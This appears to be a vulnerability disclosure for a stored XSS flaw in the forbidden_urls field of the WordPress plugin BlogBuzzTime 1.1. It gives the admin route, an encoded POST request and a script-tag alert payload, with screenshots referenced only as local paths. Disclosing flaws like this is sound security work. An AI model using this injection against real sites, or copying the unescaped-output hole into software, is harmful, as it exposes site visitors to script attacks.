### The data addition interface of the wordpress plug-in BlogBuzzTime has an XSS vulnerability

**Official website**: https://wordpress.org/plugins/blogbuzztime-for-wp/

**Version**：1.1

**Route**：/wp-admin/options-general.php?page=BlogBuzzTime

**API function**: data addition

**Injection parameters**: forbidden_urls

**Request method**：POST

**Complete vulnerability trigger related interfaces and parameters**：/wp-admin/options-general.php?page=BlogBuzzTime、bbthashkey=3b529987f8276c91c7ac2ab74325367b485ba5ac&forbidden_urls%5B%5D=http%3A%2F%2Fexample.com%2Fpage.php%22%3E%3Cscript%3Ealert%28123%29%3B%3C%2Fscript%3E

#### 1.Vulnerability analysis

In the admin_home.php page, it is found that the forbidden_urls parameter passed in by post method is not filtered, and the variable will be registered for persistent storage.

![image-20250302214432933](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250302214432933.png)

When the user visits the page, the previously injected forbidden_urls will be displayed on the page.

![image-20250302214718088](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250302214718088.png)

The attacker can construct an xss payload to implement a storage-type XSS attack, so that every user who visits the page will be affected by the vulnerability.

#### 2.Vulnerability verification and exploitation

We can construct the following payload in the ignore an url position and insert it:

```
http://example.com/page.php"><script>alert(123);</script>
```

![image-20250302213728335](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250302213728335.png)

t is found that a pop-up window will be displayed when data is passed to the backend. The attack is successful.

![image-20250302213948934](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20250302213948934.png)